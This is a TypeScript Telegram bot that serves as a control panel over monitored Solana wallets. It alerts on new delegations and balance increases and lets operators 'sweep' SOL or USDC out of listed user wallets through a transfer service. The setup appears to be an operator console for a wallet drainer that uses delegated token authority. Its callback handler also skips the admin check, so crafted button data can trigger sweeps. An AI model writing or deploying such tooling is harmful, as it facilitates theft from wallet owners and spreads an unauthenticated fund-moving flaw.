import { InlineKeyboardMarkup } from 'node-telegram-bot-api';
import { Connection, LAMPORTS_PER_SOL, PublicKey } from '@solana/web3.js';
import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { AgentDatabase } from './database.js';
import { TransferService } from './transfer.js';
import { logger } from './utils.js';

// Constants (same as in telegram.ts)
const WSOL_MINT = "So11111111111111111111111111111111111111112";
const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";

interface TelegramConfig {
  token: string;
  adminUserIds: string[];
}

interface ChatState {
  action: 'balance' | 'sweep' | 'setnickname' | null;
  wallet?: string;
  step?: 'awaiting_nickname' | 'awaiting_token' | null;
}

export class WebhookBot {
  private db: AgentDatabase;
  private transferService: TransferService;
  private connection: Connection;
  private adminUserIds: string[];
  private chatStates: Map<number, ChatState> = new Map();
  private walletSelectionMap: Map<string, { wallet: string; action: string }> = new Map();
  private selectionIdCounter: number = 0;

  constructor(
    db: AgentDatabase,
    transferService: TransferService,
    config: TelegramConfig,
    connection: Connection
  ) {
    this.db = db;
    this.transferService = transferService;
    this.connection = connection;
    this.adminUserIds = config.adminUserIds;
  }

  // ===== Main entry point for webhook =====
  async handleUpdate(update: any): Promise<void> {
    try {
      if (update.message) {
        await this.handleMessage(update.message);
      } else if (update.callback_query) {
        await this.handleCallbackQuery(update.callback_query);
      }
    } catch (error) {
      logger.error('Error processing update:', error);
    }
  }

  // ===== Message handler =====
  private async handleMessage(msg: any): Promise<void> {
    const chatId = msg.chat.id;
    const text = msg.text || '';

    if (text.startsWith('/')) {
      await this.handleCommand(chatId, text);
    } else {
      // Text input (e.g., for nickname)
      const state = this.chatStates.get(chatId);
      if (state && state.action === 'setnickname' && state.step === 'awaiting_nickname') {
        await this.handleNicknameInput(chatId, text, state.wallet!);
        return;
      }
    }
  }

  private async handleCommand(chatId: number, text: string): Promise<void> {
    const parts = text.split(' ');
    const cmd = parts[0].toLowerCase();

    if (cmd === '/ping') {
      await this.sendMessage(chatId, 'Pong! 🏓 Bot is active.');
      return;
    }

    if (!this.isAdmin(chatId)) {
      await this.sendMessage(chatId, '🚫 Permission denied. Admin only.');
      return;
    }

    switch (cmd) {
      case '/balance':
        if (parts.length > 1) {
          await this.handleBalance(chatId, parts.slice(1).join(' '));
        } else {
          await this.showWalletList(chatId, 'balance');
        }
        break;
      case '/listusers':
        await this.handleListUsers(chatId);
        break;
      case '/admin':
        await this.handleAdmin(chatId);
        break;
      case '/sweep':
        if (parts.length > 1) {
          await this.showTokenChoice(chatId, parts[1]);
        } else {
          await this.showWalletList(chatId, 'sweep');
        }
        break;
      case '/setnickname':
        if (parts.length > 2) {
          const identifier = parts[1];
          const newNickname = parts.slice(2).join(' ');
          await this.handleSetNickname(chatId, identifier, newNickname);
        } else if (parts.length > 1) {
          // /setnickname <identifier> without new name – ask for it
          const identifier = parts[1];
          let walletAddress: string;
          try {
            new PublicKey(identifier);
            walletAddress = identifier;
          } catch {
            const wallets = await this.db.getMonitoredWallets();
            const found = wallets.find(w => w.nickname === identifier);
            if (!found) {
              await this.sendMessage(chatId, `❌ No wallet found with identifier "${identifier}".`);
              return;
            }
            walletAddress = found.publicKey;
          }
          this.chatStates.set(chatId, { action: 'setnickname', wallet: walletAddress, step: 'awaiting_nickname' });
          await this.sendMessage(chatId, `✏️ Please send the new nickname for wallet:\n\`${walletAddress}\``);
        } else {
          await this.showWalletList(chatId, 'setnickname');
        }
        break;
      case '/help':
        await this.sendMessage(chatId, this.getHelpText());
        break;
      default:
        await this.sendMessage(chatId, '❓ Unknown command. Type /help for available commands.');
    }
  }

  // ===== Callback query handler =====
  private async handleCallbackQuery(callback: any): Promise<void> {
    const data = callback.data;
    if (!data) return;
    const chatId = callback.message?.chat.id;
    if (!chatId) return;

    // Wallet selection (short IDs)
    if (data.startsWith('sel_')) {
      const parts = data.split('_');
      const action = parts[1];
      const id = parts.slice(2).join('_');
      const entry = this.walletSelectionMap.get(id);
      if (!entry) {
        await this.answerCallbackQuery(callback.id, { text: 'Selection expired. Please run the command again.' });
        return;
      }
      const wallet = entry.wallet;
      this.walletSelectionMap.delete(id);

      if (action === 'balance') {
        await this.handleBalance(chatId, wallet);
      } else if (action === 'sweep') {
        await this.showTokenChoice(chatId, wallet);
      } else if (action === 'setnickname') {
        this.chatStates.set(chatId, { action: 'setnickname', wallet, step: 'awaiting_nickname' });
        await this.sendMessage(chatId, `✏️ Please send the new nickname for wallet:\n\`${wallet}\``);
      }
      await this.answerCallbackQuery(callback.id);
      return;
    }

    // Token choice for sweep
    if (data.startsWith('choose_token_')) {
      const parts = data.split('_');
      const wallet = parts[2];
      const token = parts[3];
      await this.handleSweep(chatId, wallet, token);
      await this.answerCallbackQuery(callback.id);
      return;
    }

    await this.answerCallbackQuery(callback.id, { text: 'Action not recognized' });
  }

  // ===== Helper: Show wallet list with inline buttons =====
  private async showWalletList(chatId: number, action: 'balance' | 'sweep' | 'setnickname'): Promise<void> {
    try {
      const wallets = await this.db.getMonitoredWallets();
      if (wallets.length === 0) {
        await this.sendMessage(chatId, 'No monitored wallets found.');
        return;
      }

      const buttons = wallets.slice(0, 15).map(w => {
        this.selectionIdCounter++;
        const id = `sel_${action}_${this.selectionIdCounter}`;
        this.walletSelectionMap.set(String(this.selectionIdCounter), { wallet: w.publicKey, action });
        const label = w.nickname ? `${w.nickname} (${w.publicKey.slice(0, 8)}...)` : w.publicKey.slice(0, 12);
        return [{ text: label, callback_data: id }];
      });

      const keyboard: InlineKeyboardMarkup = { inline_keyboard: buttons };
      const actionMap: Record<string, string> = {
        balance: 'check balance',
        sweep: 'sweep funds from',
        setnickname: 'rename'
      };

      await this.sendMessage(chatId, `Select a wallet to ${actionMap[action]}:`, '', { reply_markup: keyboard });
    } catch (error) {
      logger.error('Error in showWalletList:', error);
      await this.sendMessage(chatId, `❌ Error: ${error instanceof Error ? error.message : String(error)}`);
    }
  }

  // ===== Helper: Show token choice for sweep =====
  private async showTokenChoice(chatId: number, wallet: string): Promise<void> {
    try {
      const keyboard: InlineKeyboardMarkup = {
        inline_keyboard: [
          [{ text: 'SOL', callback_data: `choose_token_${wallet}_SOL` }],
          [{ text: 'USDC', callback_data: `choose_token_${wallet}_USDC` }]
        ]
      };
      await this.sendMessage(chatId, `Select token to sweep from wallet:\n\`${wallet}\``, 'Markdown', { reply_markup: keyboard });
    } catch (error) {
      logger.error('Error in showTokenChoice:', error);
      await this.sendMessage(chatId, `❌ Error: ${error instanceof Error ? error.message : String(error)}`);
    }
  }

  // ===== Nickname input =====
  private async handleNicknameInput(chatId: number, text: string, wallet: string): Promise<void> {
    const nickname = text.trim();
    if (nickname.length === 0) {
      await this.sendMessage(chatId, '❌ Nickname cannot be empty. Please send a valid name.');
      return;
    }
    await this.db.addMonitoredWallet({
      publicKey: wallet,
      nickname: nickname,
      isActive: true,
    createdAt: new Date()
    });
    this.chatStates.delete(chatId);
    await this.sendMessage(chatId, `✅ Wallet \`${wallet}\` is now known as **${nickname}**.`);
  }

  // ===== Command implementations =====
  private async handleBalance(chatId: number, query: string): Promise<void> {
    try {
      let walletAddress: string;
      try {
        new PublicKey(query);
        walletAddress = query;
      } catch {
        const wallets = await this.db.getMonitoredWallets();
        const found = wallets.find(w => w.nickname === query);
        if (!found) {
          await this.sendMessage(chatId, `❌ No wallet found with nickname "${query}".`);
          return;
        }
        walletAddress = found.publicKey;
      }

      const pubKey = new PublicKey(walletAddress);
      const solBalance = await this.connection.getBalance(pubKey);
      const sol = solBalance / LAMPORTS_PER_SOL;

      const tokenAccounts = await this.connection.getParsedTokenAccountsByOwner(pubKey, {
        programId: TOKEN_PROGRAM_ID
      });

      let tokenSummary = '';
      tokenAccounts.value.forEach((item: any) => {
        const info = item.account.data.parsed.info;
        const uiAmount = info.tokenAmount.uiAmount;
        if (uiAmount > 0) {
          const symbol = info.mint === USDC_MINT ? 'USDC' : (info.mint === WSOL_MINT ? 'wSOL' : 'Token');
          tokenSummary += `• **${symbol}:** ${uiAmount.toLocaleString()}\n`;
        }
      });

      if (!tokenSummary) tokenSummary = 'No tokens found.';

      const message = `💰 **Wallet Balance**\n\n` +
        `**Address:**\n\`${walletAddress}\`\n\n` +
        `**Native Balance:** ${sol.toFixed(4)} SOL\n\n` +
        `**Token Balances:**\n${tokenSummary}`;

      await this.sendMessage(chatId, message, 'Markdown');
      this.chatStates.delete(chatId);
    } catch (error) {
      await this.sendMessage(chatId, `❌ Error fetching balance: ${error instanceof Error ? error.message : String(error)}`);
    }
  }

  private async handleListUsers(chatId: number): Promise<void> {
    try {
      const wallets = await this.db.getMonitoredWallets();
      if (wallets.length === 0) {
        await this.sendMessage(chatId, 'No monitored wallets found.');
        return;
      }

      let message = `📋 **Monitored Wallets (${wallets.length})**\n\n`;
      const displayWallets = wallets.slice(0, 10);
      displayWallets.forEach((w, i) => {
        const status = w.isActive ? '🟢 Active' : '🔴 Inactive';
        const name = w.nickname || `User ${i+1}`;
        message += `**${name}**\nWallet: \`${w.publicKey}\`\nStatus: ${status}\n\n`;
      });

      if (wallets.length > 10) {
        message += `\n_Showing 10 of ${wallets.length} wallets._`;
      }

      await this.sendMessage(chatId, message, 'Markdown');
    } catch (error) {
      await this.sendMessage(chatId, `❌ Error: ${error instanceof Error ? error.message : String(error)}`);
    }
  }

  private async handleAdmin(chatId: number): Promise<void> {
    try {
      const adminKey = this.transferService.getAdminPublicKey();
      const pubKey = new PublicKey(adminKey);
      const balance = await this.connection.getBalance(pubKey);
      const sol = balance / LAMPORTS_PER_SOL;

      const tokenAccounts = await this.connection.getParsedTokenAccountsByOwner(pubKey, {
        programId: TOKEN_PROGRAM_ID
      });

      let tokenText = '';
      tokenAccounts.value.forEach((item: any) => {
        const info = item.account.data.parsed.info;
        const uiAmount = info.tokenAmount.uiAmount;
        if (uiAmount > 0) {
          const symbol = info.mint === WSOL_MINT ? 'wSOL' : (info.mint === USDC_MINT ? 'USDC' : 'Unknown');
          tokenText += `• **${symbol}:** ${uiAmount.toLocaleString()}\n`;
        }
      });

      if (!tokenText) tokenText = 'No tokens found.';

      const message = `🤖 **Bot Admin Wallet**\n\n` +
        `**Address:**\n\`${adminKey}\`\n\n` +
        `**Native Balance:** ${sol.toFixed(4)} SOL\n\n` +
        `**Token Balances:**\n${tokenText}\n\n` +
        `_This wallet pays for transaction fees._`;

      await this.sendMessage(chatId, message, 'Markdown');
    } catch (error) {
      await this.sendMessage(chatId, `❌ Error: ${error instanceof Error ? error.message : String(error)}`);
    }
  }

  private async handleSweep(chatId: number, userAddress: string, tokenSymbol: string): Promise<void> {
    try {
      const targetMint = tokenSymbol === 'USDC' ? USDC_MINT : WSOL_MINT;

      await this.sendMessage(chatId, `⏳ **Sweeping ${tokenSymbol}...**\nTarget: \`${userAddress}\``, 'Markdown');

      const txSignature = await this.transferService.sweepUser(userAddress, targetMint);

      const message = `✅ **Sweep Successful!**\n\n` +
        `**Token:** ${tokenSymbol}\n` +
        `**User:** \`${userAddress}\`\n` +
        `**Transaction:** [View on Explorer](https://explorer.solana.com/tx/${txSignature}?cluster=devnet)`;

      await this.sendMessage(chatId, message, 'Markdown');
      this.chatStates.delete(chatId);
    } catch (error) {
      await this.sendMessage(chatId, `❌ **Sweep Failed:** ${error instanceof Error ? error.message : String(error)}`);
    }
  }

  private async handleSetNickname(chatId: number, identifier: string, newNickname: string): Promise<void> {
    try {
      let walletAddress: string;
      try {
        new PublicKey(identifier);
        walletAddress = identifier;
      } catch {
        const wallets = await this.db.getMonitoredWallets();
        const found = wallets.find(w => w.nickname === identifier);
        if (!found) {
          await this.sendMessage(chatId, `❌ No wallet found with identifier "${identifier}".`);
          return;
        }
        walletAddress = found.publicKey;
      }

      await this.db.addMonitoredWallet({
        publicKey: walletAddress,
        nickname: newNickname,
        isActive: true,
          createdAt: new Date()
      });

      await this.sendMessage(chatId, `✅ Wallet \`${walletAddress}\` is now named **${newNickname}**.`);
    } catch (error) {
      await this.sendMessage(chatId, `❌ Error setting nickname: ${error instanceof Error ? error.message : String(error)}`);
    }
  }

  // ===== Help text =====
  private getHelpText(): string {
    return `🤖 Available Commands:

General:
/ping - Check bot status
/balance <address|nickname> - Check wallet balance (Admin only)
/listusers - List monitored wallets (Admin only)

Admin:
/admin - Show admin wallet info
/sweep - Pick a wallet & token to sweep funds
/setnickname - Pick a wallet to rename

Alerts:
The bot will automatically send alerts for:
• New delegations detected
• Balance increases
• Contract transfers`;
  }

  // ===== Send message helper =====
  private async sendMessage(
    chatId: number,
    text: string,
    parseMode: 'Markdown' | 'HTML' | '' = 'Markdown',
    extra?: any
  ): Promise<void> {
    const token = process.env.TELEGRAM_TOKEN;
    if (!token) throw new Error('TELEGRAM_TOKEN not set');
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const payload: any = {
      chat_id: chatId,
      text: text,
      parse_mode: parseMode || undefined,
      ...extra,
    };
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
      if (!response.ok) {
        const err = await response.text();
        throw new Error(`Telegram API error: ${response.status} ${err}`);
      }
    } catch (error) {
      logger.error(`Failed to send message to ${chatId}:`, error);
    }
  }

  // ===== Answer callback query helper =====
  private async answerCallbackQuery(callbackId: string, options?: { text?: string }): Promise<void> {
    const token = process.env.TELEGRAM_TOKEN;
    if (!token) throw new Error('TELEGRAM_TOKEN not set');
    const url = `https://api.telegram.org/bot${token}/answerCallbackQuery`;
    const payload: any = { callback_query_id: callbackId };
    if (options?.text) payload.text = options.text;
    try {
      await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (error) {
      logger.error(`Failed to answer callback query ${callbackId}:`, error);
    }
  }

  private isAdmin(chatId: number): boolean {
    return this.adminUserIds.includes(String(chatId));
  }
}